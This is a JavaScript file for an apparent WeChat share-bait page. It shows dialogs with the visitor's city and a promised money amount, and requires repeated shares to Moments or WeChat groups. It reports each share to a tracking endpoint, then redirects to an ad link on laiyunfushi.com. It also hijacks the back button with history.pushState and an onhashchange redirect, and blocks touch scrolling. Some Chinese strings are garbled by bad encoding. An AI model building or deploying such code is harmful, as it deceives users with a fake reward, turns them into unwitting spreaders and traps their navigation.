$(function () {
  var address = localAddress.city ? localAddress.city : (localAddress.province ? localAddress.province :
    '鍥涘窛');
  city = address.replace(/(.*)甯�/, '$1');
  city = city.replace(/(.*)鐪�/, '$1');
  qun = obj.q.length;
  quan = obj.p.length;
  obj.t = obj.t.replace(/{oss}/, obj.oss);
  obj.t = obj.t.replace(/{money}/, obj.money);
  obj.t = obj.t.replace(/{city}/, city);
  wxalert(obj.t);
  MyweChats = new MyweChat({
    'api': obj.sign,
    'title': obj.q[0]['title'].replace(/{city}/, city),
    'desc': obj.q[0]['desc'].replace(/{city}/, city),
    'img': obj.q[0]['img_url'],
    'link': obj.q[0]['link'],
    'ishide': false
  });
  MyweChats.shares = 0;
  MyweChats.shaer_tips = function () {
    if (MyweChats.share < qun) {
      if (MyweChats.share == qun - 1) {
        window._Data.Info.link = obj['p'][0]['link'];
        window._Data.Info.img_url = obj['p'][0]['img_url'];
        window._Data.Info.title = obj['p'][0]['title'].replace(/{city}/, city);
      } else {
        window._Data.Info.link = obj['q'][MyweChats.share + 1]['link'];
        window._Data.Info.desc = obj['q'][MyweChats.share + 1]['desc'].replace(/{city}/, city);
        window._Data.Info.img_url = obj['q'][MyweChats.share + 1]['img_url'];
        window._Data.Info.title = obj['q'][MyweChats.share + 1]['title'].replace(/{city}/, city);
      }
      MyweChats.Reloadconfig();
      $.post(obj.ShareCount, {
        id: obj.id,
        drainid: obj['q'][MyweChats.share]['drainid']
      });
      wxalert(((obj['q'][MyweChats.share]['content']).replace(/{oss}/g, obj.oss)).replace(/{monesy}/,
        obj.money));
      MyweChats.share++;

    } else {
      wxalert(
        '<p style="font-size: 20px">&#x8BF7;&#x5206;&#x4EAB;&#x5230;<span style="color: red">&#x670B;&#x53CB;&#x5708;</span>&#xFF0C;&#x5FAE;&#x4FE1;&#x7FA4;<span style="color: blue">&#x65E0;&#x6548;!</span></p>'
      );
    }
  };
  MyweChats.shaer_p_tips = function () {
    if (MyweChats.share < qun) {
      wxalert(
        '<p style="font-size: 20px;">&#x8BF7;&#x5206;&#x4EAB;&#x5230;<span style="color: red;">&#x5FAE;&#x4FE1;&#x7FA4;</span>&#xFF0C;&#x670B;&#x53CB;&#x5708;<span style="color: blue">&#x65E0;&#x6548;!</span></p>'
      );
    } else {
      if (MyweChats.shares < quan) {
        if (MyweChats.shares + 1 < quan) {
          window._Data.Info.link = obj['p'][MyweChats.shares + 1]['link'];
          window._Data.Info.img_url = obj['p'][MyweChats.shares + 1]['img_url'];
          window._Data.Info.title = obj['p'][MyweChats.shares + 1]['title'].replace(/{city}/,
            city);
        }
        MyweChats.Reloadconfig();
        if (MyweChats.shares + 1 == quan) {
          wxalert(((obj['p'][MyweChats.shares]['content']).replace(/{oss}/g, obj.oss).replace(
            /{monesy}/, obj.money)), '&#x786E;&#x5B9A;', function () {
            $.post('http://laiyunfushi.com/Advlist?dir=' + obj.xifen + '&index=hb',
              function (e) {
                location.href = e.v[0];
              })
          });
        } else {
          wxalert(((obj['p'][MyweChats.shares]['content']).replace(/{oss}/g, obj.oss)).replace(
            /{monesy}/, obj.money));
        }
        $.post(obj.ShareCount, {
          id: obj.id,
          drainid: obj['p'][MyweChats.shares]['drainid']
        });
        MyweChats.shares++;
      } else {
        wxalert(((obj['p'][quan - 1]['content']).replace(/{oss}/g, obj.oss)).replace(/{monesy}/,
          obj.money));
      }
    }

  };
  $('#tk').on('click', function () {
    switch (MyweChats.share) {
      case 0:
        wxalert(obj.t);
        break;
      default:
        if (MyweChats.share == qun) {
          wxalert(((obj['q'][qun - 1]['content']).replace(/{oss}/g, obj.oss)).replace(
            /{monesy}/, obj.money));
        } else {
          wxalert(((obj['q'][MyweChats.share - 1]['content']).replace(/{oss}/g, obj.oss)).replace(
            /{monesy}/, obj.money));
        }
        if (MyweChats.shares > 0) {
          if (MyweChats.shares == quan) {
            wxalert(((obj['p'][quan - 1]['content']).replace(/{oss}/g, obj.oss)).replace(
              /{monesy}/, obj.money));
          } else {
            wxalert(((obj['p'][MyweChats.shares - 1]['content']).replace(/{oss}/g, obj.oss))
              .replace(/{monesy}/, obj.money));
          }
        }
        break;
    }

  });
  if (obj.iswx == 1) {
    var system = {
      win: false,
      mac: false,
      xll: false
    };
    var p = navigator.platform;
    system.win = p.indexOf("Win") == 0;
    system.mac = p.indexOf("Mac") == 0;
    system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
//    if (system.win || system.mac) {
//      location.href = obj.errurl;
//    }
  }
  if (obj.isx == 1) {
    document.body.addEventListener('touchmove', function (event) {
      event.preventDefault();
    }, false);
  }

});

$.getJSON(obj.advapi, function (e) {
  setTimeout(function () {
    history.pushState(history.length + 1, "message", "#" + new Date().getTime());
  }, 200);
  window.onhashchange = function () {
    // location.href = e.url + '&pk=hb';
    location.href = e.v[0];
  };
});

function wxalert(n, b, i) {
  var r, u;
  r =
    '<div class="weui_dialog_alert" style="position: fixed; z-index: 2000; display: none;margin-left:15%;margin-right:15%">';
  r += '<div class="weui_mask"></div>';
  r += '<div class="weui_dialog">';
  r +=
    '<i class="weui_close"><svg t="1540783423798" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="s="http://www.w3.org/2000/svg" p-" p-id="1931" xmlns:xlink="k="http://www.w3.org/1999/xlink" wi" width="25" height="25"><path style="fill:#666;" d="M176.661601 817.172881C168.472798 825.644055 168.701706 839.149636 177.172881 847.338438 185.644056 855.527241 199.149636 855.298332 207.338438 846.827157L826.005105 206.827157C834.193907 198.355983 833.964998 184.850403 825.493824 176.661601 817.02265 168.472798 803.517069 168.701706 795.328267 177.172881L176.661601 817.172881ZM795.328267 846.827157C803.517069 855.298332 817.02265 855.527241 825.493824 847.338438 833.964998 839.149636 834.193907 825.644055 826.005105 817.172881L207.338438 177.172881C199.149636 168.701706 185.644056 168.472798 177.172881 176.661601 168.701706 184.850403 168.472798 198.355983 176.661601 206.827157L795.328267 846.827157Z" p-id="1932"></path></svg></i>';
  r += '<div class="weui_dialog_hd"><strong class="weui_dialog_title"></strong></div>';
  r += '<div class="weui_dialog_bd" style="color:#000;padding-top:20px;padding-bottom:10px;"></div>';
  r += '<div class="weui_dialog_ft">';
  r += '<a href="javascript:;" class="weui_btn_dialog primary">濂�</a>';
  r += "</div>";
  r += "</div>";
  r += "</div>";
  $(".weui_dialog_alert").length > 0 ? $(".weui_dialog_alert .weui_dialog_bd").empty() : $("body").append($(r));
  u = $(".weui_dialog_alert");
  u.show();
  u.find(".weui_dialog_bd").html(n);
  u.find(".weui_btn_dialog").html(b ? b : "濂界殑");
  u.find(".weui_btn_dialog").off("click").on("click", function () {
    u.hide();
    i && i()
  });
  u.find(".weui_close").off("click").on("click", function () {
    u.hide();
  });
}